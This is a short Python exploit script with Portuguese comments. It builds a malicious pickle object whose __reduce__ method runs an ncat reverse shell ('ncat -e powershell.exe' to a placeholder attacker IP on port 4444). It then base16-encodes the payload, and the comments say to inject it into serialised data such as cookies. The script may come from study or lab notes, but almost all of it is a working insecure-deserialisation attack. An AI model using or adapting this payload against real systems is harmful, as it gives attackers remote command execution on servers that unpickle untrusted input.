import pickle
import base64


class malicious_payload:
    def __reduce__(self):
        import os
        return (os.system, ("ncat -e powershell.exe *IP-DO-ATACANTE* 4444",))


serialized = pickle.dumps(malicious_payload())
encoded = base64.b16encode(serialized)

print(encoded)

# --> em suma, o código cria uma versão serializada (em bytes) do payload "ncat -e (...)"
# --> esse payload deve ser injetado em alguma area de informações serializadas, como cookies
# --> ex: injetar no console atraves do document.cookie
